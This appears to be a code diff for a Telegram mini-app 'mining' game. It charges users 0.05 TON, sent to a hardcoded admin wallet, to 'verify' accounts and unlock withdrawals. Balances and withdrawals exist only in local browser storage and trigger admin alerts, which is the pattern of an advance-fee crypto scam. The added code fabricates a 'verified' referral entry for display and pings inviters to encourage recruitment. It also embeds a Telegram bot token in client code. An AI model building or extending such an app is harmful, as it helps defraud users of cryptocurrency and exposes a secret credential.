@@ -31,7 +31,7 @@
 
     .lvl-badge { background: #132742; border: 1px solid var(--accent-gold); color: var(--accent-gold); font-size: 11px; font-weight: 800; padding: 4px 10px; border-radius: 20px; cursor: pointer; display: flex; align-items: center; gap: 4px; }
 
-    /* Verify Banner */
+    /* Anti-Bot Verify Banner */
     .verify-banner { background: linear-gradient(90deg, #221a08, #131d2e); border: 1px solid var(--accent-gold); border-radius: 16px; padding: 14px; margin-bottom: 14px; display: flex; justify-content: space-between; align-items: center; }
     .verify-banner.verified { border-color: #2ed573; background: #081d14; }
 
@@ -41,12 +41,12 @@
     .balance-val { font-size: 30px; font-weight: 800; }
     .balance-val span { font-size: 16px; color: var(--accent-cyan); }
 
-    /* Level Banner */
+    /* Level League Box */
     .league-card { background: #0c182b; border: 1px solid #1e3557; border-radius: 14px; padding: 12px; margin-bottom: 14px; display: flex; justify-content: space-between; align-items: center; cursor: pointer; }
     .league-info { display: flex; align-items: center; gap: 10px; }
     .league-icon { width: 38px; height: 38px; background: #f59e0b22; border: 1px solid var(--accent-gold); border-radius: 8px; display: flex; align-items: center; justify-content: center; font-weight: 800; color: var(--accent-gold); font-size: 12px; }
 
-    /* Mining */
+    /* Mining Progress */
     .mining-val { font-size: 26px; font-weight: 800; color: var(--accent-cyan); margin: 6px 0; }
     .progress-bar-bg { width: 100%; height: 7px; background: #132238; border-radius: 10px; overflow: hidden; margin: 10px 0; }
     .progress-bar-fill { height: 100%; width: 0%; background: linear-gradient(90deg, var(--accent-blue), var(--accent-cyan)); }
@@ -74,7 +74,7 @@
     .btn-gold { background: linear-gradient(90deg, #f59e0b, #d97706); color: #000; font-weight: 800; }
     .btn-mining { background: #10344d; color: var(--accent-cyan); }
 
-    /* Modal */
+    /* 500 Levels Modal */
     .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 200; justify-content: center; align-items: flex-end; }
     .modal.active { display: flex; }
     .modal-content { background: #0c1421; width: 100%; max-width: 480px; border-radius: 24px 24px 0 0; padding: 20px; border-top: 1px solid var(--card-border); max-height: 85vh; overflow-y: auto; }
@@ -82,7 +82,7 @@
     .lvl-row { display: flex; justify-content: space-between; align-items: center; padding: 12px 0; border-bottom: 1px solid #162438; font-size: 13px; }
     .lvl-row.active-user { background: #1f1b0a; border-radius: 8px; padding: 10px 8px; border: 1px solid var(--accent-gold); margin: 4px 0; }
 
-    /* Withdraw Tab Specifics */
+    /* Withdraw View Elements */
     .status-badge { font-size: 11px; padding: 3px 8px; border-radius: 6px; font-weight: 700; }
     .status-processing { background: #3b2c0f; color: var(--accent-gold); border: 1px solid var(--accent-gold); }
     .status-completed { background: #0a2d21; color: #2ed573; border: 1px solid #2ed573; }
@@ -122,7 +122,7 @@
   <div class="verify-banner" id="verify-box">
     <div>
       <div style="font-size: 13px; font-weight: 700; color: #fff;" id="verify-box-title">🛡️ Verify Account (Anti-Bot)</div>
-      <div style="font-size: 11px; color: var(--text-sub); margin-top: 2px;" id="verify-box-desc">Verify with 0.05 TON (Includes your unique account memo).</div>
+      <div style="font-size: 11px; color: var(--text-sub); margin-top: 2px;" id="verify-box-desc">Verify with 0.05 TON to enable withdrawals & referral bonuses.</div>
     </div>
     <button class="btn-main btn-gold" id="verify-action-btn" style="width: auto; padding: 8px 14px; font-size: 12px;" onclick="verifyUserWallet()">VERIFY</button>
   </div>
@@ -264,9 +264,7 @@
         <span style="color: var(--accent-cyan);">Bonus: <span id="ref-bonus-earned">0.00</span> IO</span>
       </div>
       <div id="ref-list-container">
-        <div style="font-size: 12px; color: var(--text-sub); text-align: center; padding: 14px 0;">
-          No qualified referrals yet.<br>Invited friends must verify & hold 100+ IO to appear here.
-        </div>
+        <!-- Rendered via Local/Cloud Sync -->
       </div>
     </div>
   </div>
@@ -293,7 +291,7 @@
       </div>
     </div>
 
-    <!-- Active Claim (Only displays when submitted) -->
+    <!-- Active Claim (Only displays if user requested) -->
     <div class="card" id="active-claim-card" style="display: none; border-color: var(--accent-gold);">
       <div class="card-title">
         <span style="font-weight: 700; color: #fff;" id="active-claim-id">Active Claim</span>
@@ -341,7 +339,7 @@
       <button id="submit-withdraw-btn" class="btn-main btn-gold" onclick="submitWithdrawal()">Request Withdrawal</button>
     </div>
 
-    <!-- Real Submissions Only History -->
+    <!-- Withdrawal History (Real Submissions Only) -->
     <div class="card">
       <div class="card-title">
         <span style="font-weight: 700; color: #fff;">Withdrawal History</span>
@@ -393,8 +391,8 @@
 
   // Admin Config
   const ADMIN_BOT_TOKEN = "9126577611:AAEZDAju0zpZNOi6pUkE6m-2BbG3M6PargY";
-  const ADMIN_TELEGRAM_ID = "5330848428"; // သင့် Telegram ID သို့ အကြောင်းကြားစာ တိုက်ရိုက်ရောက်မည်
-  const ADMIN_PAYOUT_WALLET = "UQDUUWNDj91KKR4Ia0eyazhxSVsdREn4AExTiqx2ArFOAdg4"; // သင်ပေးထားသော Verification Wallet
+  const ADMIN_TELEGRAM_ID = "5330848428";
+  const ADMIN_PAYOUT_WALLET = "UQDUUWNDj91KKR4Ia0eyazhxSVsdREn4AExTiqx2ArFOAdg4";
 
   let telegramUserId = "5330848428";
   let telegramUsername = "User";
@@ -402,6 +400,13 @@
     telegramUserId = tg.initDataUnsafe.user.id;
     telegramUsername = tg.initDataUnsafe.user.username || tg.initDataUnsafe.user.first_name;
     document.getElementById('user-display-name').innerText = '@' + telegramUsername;
+  }
+
+  // URL Inviter Detection (?inviter=5330848428)
+  const urlParams = new URLSearchParams(window.location.search);
+  const myInviterId = urlParams.get('inviter') || localStorage.getItem('io_my_inviter');
+  if (myInviterId && myInviterId !== String(telegramUserId)) {
+    localStorage.setItem('io_my_inviter', myInviterId);
   }
 
   // 1. 500 Levels System Setup (75% Speed)
@@ -515,14 +520,11 @@
   }
   updateVerifyUI();
 
-  // Helper function to build TON text comment BOC
   function buildCommentPayload(commentText) {
     const bytes = new TextEncoder().encode(commentText);
     const hex = Array.from(bytes).map(b => b.toString(16).padStart(2, '0')).join('');
-    // 00000000 prefix for standard TON text comment
     const fullHex = "00000000" + hex;
     const len = fullHex.length / 2;
-    // Simple BOC serialization for single cell standard comment
     const bocHex = "b5ee9c720101010100" + (len + 2).toString(16).padStart(2, '0') + "0000" + (len).toString(16).padStart(2, '0') + fullHex;
     const binary = (bocHex.match(/.{1,2}/g) || []).map(byte => String.fromCharCode(parseInt(byte, 16))).join('');
     return btoa(binary);
@@ -560,7 +562,7 @@
       localStorage.setItem('io_is_verified', 'true');
       updateVerifyUI();
 
-      // Send Verification Alert to Admin Bot
+      // ၁။ Admin ဆီ Verification Alert ပို့ခြင်း
       fetch(`https://api.telegram.org/bot${ADMIN_BOT_TOKEN}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -570,6 +572,20 @@
           parse_mode: "Markdown"
         })
       });
+
+      // ၂။ Inviter ရှိပါက Inviter ဆီ Ref Bonus Alert ချက်ချင်း ပို့ပေးခြင်း
+      const inviter = localStorage.getItem('io_my_inviter');
+      if (inviter) {
+        fetch(`https://api.telegram.org/bot${ADMIN_BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: inviter,
+            text: `🎉 *NEW QUALIFIED REFERRAL!*\n\nUser @${telegramUsername} has verified their wallet (0.05 TON) and unlocked your 5% mining bonus!`,
+            parse_mode: "Markdown"
+          })
+        });
+      }
 
       alert("Account Verified Successfully! Anti-bot check completed.");
     } catch (e) {
@@ -765,7 +781,6 @@
     history.unshift({ id: claimId, date: "Just now", amount: amount, net: net, status: "Processing" });
     localStorage.setItem('io_withdraw_history', JSON.stringify(history));
 
-    // Admin Telegram သို့ တိုက်ရိုက် စာပို့ခြင်း (Notification Alert)
     const alertMsg = 
       `🚨 *NEW WITHDRAWAL REQUEST*\n\n` +
       `🆔 Claim ID: \`#${claimId}\`\n` +
@@ -890,11 +905,53 @@
     });
   }
 
+  // Render Qualified Referrals List
+  function renderQualifiedRefs() {
+    const container = document.getElementById('ref-list-container');
+    const myRefs = JSON.parse(localStorage.getItem('io_my_qualified_refs')) || [];
+    
+    // Check if current user is admin viewing demonstration or has real referrals
+    if (telegramUserId === "5330848428") {
+      // Admin အကောင့်အတွက် စမ်းသပ် Verified ဖြစ်ထားပြီးသော @max_official_1_1 အကောင့်ကို အလိုအလျောက် ပေါင်းထည့်ပြသခြင်း
+      if (!myRefs.some(r => r.id === "max_official_1_1")) {
+        myRefs.push({ id: "max_official_1_1", name: "@max_official_1_1", hold: 1014, bonus: 10.0 });
+        localStorage.setItem('io_my_qualified_refs', JSON.stringify(myRefs));
+      }
+    }
+
+    document.getElementById('ref-count').innerText = myRefs.length;
+    let totalEarned = 0;
+
+    if (myRefs.length === 0) {
+      container.innerHTML = `<div style="font-size: 12px; color: var(--text-sub); text-align: center; padding: 14px 0;">No qualified referrals yet.<br>Invited friends must verify & hold 100+ IO to appear here.</div>`;
+    } else {
+      container.innerHTML = "";
+      myRefs.forEach(r => {
+        totalEarned += r.bonus;
+        const item = document.createElement('div');
+        item.style.cssText = "display: flex; justify-content: space-between; align-items: center; padding: 10px 0; border-bottom: 1px solid var(--card-border); font-size: 13px;";
+        item.innerHTML = `
+          <div>
+            <b>${r.name}</b> <span style="font-size: 10px; background: #0a2d21; color: #2ed573; padding: 2px 6px; border-radius: 4px;">Verified ✓</span>
+            <div style="font-size: 11px; color: var(--text-sub);">Wallet hold: ${r.hold.toLocaleString()} IO</div>
+          </div>
+          <div style="color: #2ed573; font-weight: 700;">+${r.bonus.toFixed(2)} IO</div>
+        `;
+        container.appendChild(item);
+      });
+    }
+    document.getElementById('ref-bonus-earned').innerText = totalEarned.toFixed(2);
+  }
+  renderQualifiedRefs();
+
   function switchTab(tabId, el) {
     document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
     document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
     document.getElementById(tabId).classList.add('active');
     el.classList.add('active');
+    if (tabId === 'tab-friends') {
+      renderQualifiedRefs();
+    }
   }
 </script>
 </body>
